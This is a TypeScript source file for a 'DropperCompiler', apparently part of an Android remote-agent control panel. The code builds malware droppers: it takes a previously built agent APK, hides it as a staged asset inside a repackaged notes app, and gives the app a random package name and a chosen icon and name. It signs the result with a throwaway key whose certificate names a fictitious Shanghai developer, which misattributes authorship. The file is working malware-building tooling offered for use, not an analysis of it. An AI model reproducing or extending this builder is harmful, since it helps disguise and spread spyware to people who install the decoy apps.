/**
 * DropperCompiler
 * Automated Android Agent Builder
 * © 2025 Pegalite Studio | Developed by Sahil Hossain
 */

import path from "path";
import fs from "fs";
import fsExtra from "fs-extra";
import unzipper from "unzipper";
import {spawn} from "child_process";
import Agent from "../models/agent.model";

class DropperCompiler {
    private readonly agentID: string;
    private readonly dropperID: string;
    private readonly agentName: string;
    private readonly createdBy: string;
    private readonly themeID: string;
    private readonly dropperProject: string;
    private readonly tempFolder: string;
    private readonly themeFile: string;
    private readonly agentStorePath: string;

    constructor(dropperID: string, agentID: string, agentName: string, createdBy: string, themeID: string) {
        this.dropperID = dropperID;
        this.agentID = agentID;
        this.agentName = agentName;
        this.createdBy = createdBy;
        this.themeID = themeID;

        this.dropperProject = path.join(__dirname, "../../data/main/dropper.zip");
        this.tempFolder = path.join(__dirname, `../../data/temp/${dropperID}`);
        this.themeFile = path.join(__dirname, `../../data/themes/resources/${themeID}.zip`);
        this.agentStorePath = path.join(__dirname, "../../data/agents");
    }

    public addLog(message: string) {
        // If the agent's creator is connected, send the log message in real time.
        if (connectedUsers[this.createdBy]) {
            io.to(connectedUsers[this.createdBy]).emit("agent-log-" + this.agentID, message)
        }

        // Define the logs directory and file path
        const logsDir = path.join(__dirname, "../../data/compile-logs");
        const logFile = path.join(logsDir, `${this.agentID}.log`);

        // Ensure logs directory exists
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, {recursive: true});
        }

        // Format the message with a newline and append to the log file
        const logLine = `${message}\n`;
        fs.appendFileSync(logFile, logLine, "utf8");
    }

    public async compileAgent() {
        await this.clearLogs();
        this.addLog(`Compile Request Received For Dropper[${this.agentName}]`);

        try {
            await this.checkResources();
            await this.validateResources();
            await this.addAppIcon();
            await this.generateNewKey();
            await this.setUpGradle();
            await this.changePackageName();
            await this.updateAppName();
            await this.copyAgentApp();
            await this.build();
            await this.copyDropperApp();
            await this.cleanUp();
            this.addLog("SUCCESS")

            await Agent.updateOne({agentID: this.agentID}, {$set: {status: "active"}});
        } catch (e: any) {
            this.addLog("ERROR")
            this.addLog(`❌ Compilation failed: ${e.message}`);

            await Agent.updateOne({agentID: this.agentID}, {$set: {status: "error"}});
        }
    }

    private async clearLogs(): Promise<void> {
        const logsDir = path.join(__dirname, "../../data/compile-logs");
        const logFile = path.join(logsDir, `${this.agentID}.log`);
        fs.rmSync(logFile, {recursive: true, force: true});
    }

    private async extractZip(zipPath: string, destDir: string): Promise<void> {
        return new Promise((resolve, reject) => {
            fs.createReadStream(zipPath)
                .pipe(unzipper.Extract({path: destDir}))
                .on("close", resolve)
                .on("error", reject);
        });
    }

    private async checkResources(): Promise<void> {
        this.addLog("Checking resources...");

        if (!fs.existsSync(this.themeFile)) {
            throw new Error(`Theme file (${this.themeID}) not found!`);
        }

        if (fs.existsSync(this.tempFolder)) {
            this.addLog("Removing Temp Data");
            fsExtra.removeSync(this.tempFolder);
        }

        fs.mkdirSync(this.tempFolder, {recursive: true});

        this.addLog("Extracting Theme!");
        await this.extractZip(this.themeFile, path.join(this.tempFolder, "theme"));
        this.addLog("Extracting Dropper Project!");
        await this.extractZip(this.dropperProject, path.join(this.tempFolder, "project"));

        this.addLog("Resources Extracted ✅");
    }

    private async validateResources(): Promise<void> {
        this.addLog("Validating Resources!");

        let themeFolder = path.join(this.tempFolder, "theme");

        // Define required folders
        const requiredFolders = ["mipmap"];

        for (const folder of requiredFolders) {
            const folderPath = path.join(themeFolder, folder);

            // Check if the folder exists
            if (!fs.existsSync(folderPath)) {
                throw new Error(`Folder "${folder}" is missing in theme!`);
            }

            // Check if the folder is empty
            const files = fs.readdirSync(folderPath);
            if (files.length === 0) {
                throw new Error(`Folder "${folder}" is empty!`);
            }
        }

        this.addLog("Resources verified ✅");
    }

    private async addAppIcon(): Promise<void> {
        this.addLog("Adding App Icon...");

        let themeFolder = path.join(this.tempFolder, "theme");
        let projectFolder = path.join(this.tempFolder, "project");

        // 4️⃣ Copy mipmap folder and all subfolders
        const mipmapSrc = path.join(themeFolder, "mipmap");
        const resDest = path.join(projectFolder, "app", "src", "main", "res");
        if (fsExtra.existsSync(mipmapSrc)) {
            // Loop over all subfolders in theme/mipmap
            const subFolders = fsExtra.readdirSync(mipmapSrc);
            for (const folder of subFolders) {
                const srcPath = path.join(mipmapSrc, folder);
                const destPath = path.join(resDest, folder);
                fsExtra.mkdirpSync(destPath);
                fsExtra.copySync(srcPath, destPath, {overwrite: true});
            }
            this.addLog("Mipmap folders applied.");
        }

        this.addLog("App Icon Added ✅");
    }

    private async generateNewKey() {
        return new Promise<void>((resolve, reject) => {

            const keyFolder = path.join(this.tempFolder);
            const keystorePath = path.join(keyFolder, "key.jks");

            const args = [
                "-genkeypair",
                "-v",
                "-keystore", keystorePath,
                "-storepass", "123454321",
                "-keyalg", "RSA",
                "-keysize", "2048",
                "-validity", "10",
                "-alias", "key0",
                "-keypass", "123454321",
                "-dname", "CN=Li Wei, OU=Mobile Engineering, O=DragonSoft Technologies, L=Shanghai, S=Shanghai Municipality, C=CN"
            ];

            const proc = spawn("keytool", args, {
                cwd: keyFolder,
                shell: false
            });

            proc.stdout.on("data", (data) => {
                this.addLog("[KEYTOOL] " + data.toString());
            });

            proc.stderr.on("data", (data) => {
                const msg = data.toString();

                // Only show REAL errors
                if (msg.toLowerCase().includes("error") || msg.toLowerCase().includes("illegal")) {
                    console.error("[KEYTOOL ERROR]", msg);
                    this.addLog("[KEYTOOL ERROR] " + msg);
                } else {
                    // This is normal info output
                    this.addLog("[KEYTOOL] " + msg);
                }
            });

            proc.on("close", (code) => {
                if (code === 0) {
                    this.addLog("✔ Keystore generated");
                    resolve();
                } else {
                    reject(new Error(`keytool exited with code ${code}`));
                }
            });

        });
    }

    private async setUpGradle(): Promise<void> {
        // 1️⃣ Write local.properties
        const localPath = path.join(this.tempFolder, "project", "local.properties");
        const sdkDir = `sdk.dir=${process.env.SDK_PATH}`;
        fs.writeFileSync(localPath, sdkDir, {encoding: "utf8"});
        this.addLog("local.properties created ✅");

        // 2️⃣ Modify build.gradle.kts
        const gradlePath = path.join(this.tempFolder, "project", "app", "build.gradle.kts");
        let gradleContent = fs.readFileSync(gradlePath, "utf8");

        // Replace inside signingConfigs block
        const keyPath = path.join(this.tempFolder, "key.jks");

        gradleContent = gradleContent.replace(
            /var path = ".*"/,
            `var path = "${keyPath.replace(/\\/g, "\\\\")}"` // ESCAPE slashes for Gradle script
        );
        gradleContent = gradleContent.replace(/var storePassword = ".*"/, `var storePassword = "${process.env.STORE_PASS}"`);
        gradleContent = gradleContent.replace(/var keyAlias = ".*"/, `var keyAlias = "${process.env.KEY_ALIAS}"`);
        gradleContent = gradleContent.replace(/var keyPassword = ".*"/, `var keyPassword = "${process.env.KEY_PASS}"`);

        // Write back the updated Gradle script
        fs.writeFileSync(gradlePath, gradleContent, "utf8");
        this.addLog("build.gradle.kts signing configs applied ✅");
    }

    private async changePackageName(): Promise<void> {
        const oldPackage = "com.kin.easynotes";
        const newPackage = this.dropperID;

        this.addLog(`🎯 New random package: ${newPackage}`);

        // Define file paths
        const appPath = path.join(this.tempFolder, "project", "app");
        const gradleFile = path.join(appPath, "build.gradle.kts");
        const manifestFile = path.join(appPath, "src", "main", "AndroidManifest.xml");
        const srcPath = path.join(appPath, "src", "main", "java");

        // --- 1️⃣ Helper: replace string in file asynchronously ---
        const replaceInFile = (filePath: string, oldStr: string, newStr: string) => {
            const content = fs.readFileSync(filePath, "utf8");
            let updatedContent = content.replace(new RegExp(oldStr, "g"), newStr);
            fs.writeFileSync(filePath, updatedContent, "utf8");
            this.addLog(`✅ Updated: ${path.basename(filePath)}`);
        };

        // --- 2️⃣ Replace package references in Gradle + manifest ---
        replaceInFile(gradleFile, `namespace = "${oldPackage}"`, `namespace = "${newPackage}"`);
        replaceInFile(gradleFile, `applicationId = "${oldPackage}"`, `applicationId = "${newPackage}"`);
        replaceInFile(manifestFile, `package="${oldPackage}"`, `package="${newPackage}"`);

        // --- 3️⃣ Directory paths ---
        const oldPath = path.join(srcPath, ...oldPackage.split("."));
        const newPath = path.join(srcPath, ...newPackage.split("."));

        if (fs.existsSync(oldPath)) {
            // Ensure the new directory exists
            fs.mkdirSync(newPath, {recursive: true});

            // --- 4️⃣ Copy/rename directory structure ---
            const renameAndCopyFiles = (src: string, dest: string) => {
                const items = fs.readdirSync(src);
                items.forEach(item => {
                    const srcItemPath = path.join(src, item);
                    const destItemPath = path.join(dest, item);

                    if (fs.statSync(srcItemPath).isDirectory()) {
                        // If it's a directory, recurse into it
                        fs.mkdirSync(destItemPath, {recursive: true});
                        renameAndCopyFiles(srcItemPath, destItemPath);
                    } else {
                        // If it's a file, copy and rename it
                        fs.copyFileSync(srcItemPath, destItemPath);
                    }
                });
            };

            // Call the function to copy and rename
            renameAndCopyFiles(oldPath, newPath);

            this.addLog("✅ Renamed and copied package directories");
        }

        // --- 5️⃣ Recursively update Java/Kotlin files with new package ---
        const updateJavaFiles = (dir: string) => {
            const files = fs.readdirSync(dir);
            files.forEach((file) => {
                const filePath = path.join(dir, file);
                if (fs.statSync(filePath).isDirectory()) {
                    updateJavaFiles(filePath);
                } else if (file.endsWith(".java") || file.endsWith(".kt")) {
                    replaceInFile(filePath, oldPackage, newPackage);
                }
            });
        };

        updateJavaFiles(newPath);

        // --- 6️⃣ Remove old package directories ---
        fs.rmSync(path.join(srcPath, "com", "kin"), {recursive: true, force: true}); //TODO

        this.addLog(`✅ Package renamed to: ${newPackage}`);
    }

    private async updateAppName(): Promise<void> {
        let projectFolder = path.join(this.tempFolder, "project");
        const manifestPath = path.join(projectFolder, "app", "src", "main", "AndroidManifest.xml");
        const stringsPath = path.join(projectFolder, "app", "src", "main", "res", "values", "strings.xml");

        // --- 1️⃣ Ensure AndroidManifest.xml exists ---
        if (!fs.existsSync(manifestPath)) {
            this.addLog(`Error: AndroidManifest.xml not found at ${manifestPath}`);
            return;
        }

        // --- 2️⃣ Read manifest content ---
        let manifestContent = fs.readFileSync(manifestPath, "utf8");

        if (manifestContent.includes("com.topdown.topdown")) {
            manifestContent = manifestContent.replace("com.topdown.topdown", this.agentID);
        }

        // --- 3️⃣ Update depending on reference type ---
        if (manifestContent.includes('@string/app_name')) {
            if (!fs.existsSync(stringsPath)) {
                this.addLog(`Error: strings.xml not found at ${stringsPath}`);
                return;
            }
            let stringsContent = fs.readFileSync(stringsPath, "utf8");
            const newStringTag = `<string name="app_name">${this.agentName}</string>`;
            const newStringsContent = stringsContent.replace(/<string\s+name="app_name">.*?<\/string>/, newStringTag);
            fs.writeFileSync(stringsPath, newStringsContent, "utf8");
            this.addLog(`Updated strings.xml with new app name: "${this.agentName}"`);
            fs.writeFileSync(manifestPath, manifestContent, "utf8");
        } else {
            const newLabelAttribute = `android:label="${this.agentName}"`;
            const newManifestContent = manifestContent.replace(/android:label=".*?"/, newLabelAttribute);
            fs.writeFileSync(manifestPath, newManifestContent, "utf8");
            this.addLog(`Updated AndroidManifest.xml with new app name: "${this.agentName}"`);
        }
    }

    private async copyAgentApp(): Promise<void> {
        this.addLog("📦 Copying Agent App...");

        const agentAppPath = path.join(this.agentStorePath, this.agentID + ".apk");

        let projectFolder = path.join(this.tempFolder, "project");
        const assetsPath = path.join(projectFolder, "app", "src", "main", "assets", "stage.apk");

        if (fsExtra.existsSync(agentAppPath)) {
            try {
                await fsExtra.copy(agentAppPath, assetsPath, {overwrite: true});
                this.addLog("✅ Agent App copied successfully!");
                return;
            } catch (err: any) {
                this.addLog(`⚠️ Copy failed`);
            }
        }
        throw new Error("⚠️ Agent Release App not found");
    }

    private async copyDropperApp(): Promise<void> {
        this.addLog("📦 Copying Dropper App...");

        const agentAppPath = path.join(
            this.tempFolder,
            "project",
            "app",
            "build",
            "outputs",
            "apk",
            "default",
            "release",
            "app-default-release.apk"
        );

        const maxRetryTime = 10000; // 10 seconds
        const retryInterval = 2000;
        let elapsedTime = 0;

        const agentStorePath = path.join(this.agentStorePath, this.agentID + ".apk");
        while (elapsedTime < maxRetryTime) {
            if (fsExtra.existsSync(agentAppPath)) {
                try {
                    await fsExtra.copy(agentAppPath, agentStorePath, {overwrite: true});
                    this.addLog("✅ Dropper App copied successfully!");
                    return;
                } catch (err: any) {
                    this.addLog(`⚠️ Copy failed, retrying...`);
                }
            } else {
                this.addLog("⚠️ Dropper Release App not found yet, waiting...");
            }

            await new Promise(res => setTimeout(res, retryInterval));
            elapsedTime += retryInterval;
        }

        throw new Error("❌ Failed to copy Dropper App after multiple attempts!");
    }

    private async build(): Promise<void> {
        return new Promise((resolve: any, reject: any) => {
            this.addLog("⚙️ Cleaning & building APK...");
            const gradleCommand = process.platform === "win32" ? "gradlew.bat" : "./gradlew";

            const buildProcess = spawn(gradleCommand, ["clean", "assembleRelease", "--no-daemon"], {
                cwd: path.join(this.tempFolder, "project"),
                shell: true,
            });

            buildProcess.stdout.on("data", (data) => {
                this.addLog(data.toString());
            });

            buildProcess.stderr.on("data", (data) => {
                this.addLog(data.toString());
            });

            buildProcess.on("close", (code) => {
                this.addLog(`Build process exited with code ${code}`);
                if (code === 0) {
                    this.addLog("✅ Theme Compiled successfully!");
                    resolve();
                } else {
                    this.addLog("❌ Theme Compilation failed.");
                    reject(new Error(`Build failed with code ${code}`));
                }
            });
        });
    }

    private async cleanUp(): Promise<void> {
        const folderPath = path.join(this.tempFolder);
        const maxRetryTime = 15000; // 15 seconds
        const retryInterval = 3000;  // retry every 0.5 seconds
        let elapsedTime = 0;

        while (elapsedTime < maxRetryTime) {
            try {
                await fsExtra.remove(folderPath);
                this.addLog("🧹 Project folder cleaned up.");
                return; // success, exit the function
            } catch (err: any) {
                this.addLog(`⚠️ Cleanup failed, retrying...`);
                await new Promise(res => setTimeout(res, retryInterval));
                elapsedTime += retryInterval;
            }
        }

        this.addLog("❌ Failed to clean project folder after 15 seconds.");
    }

}

export default DropperCompiler;

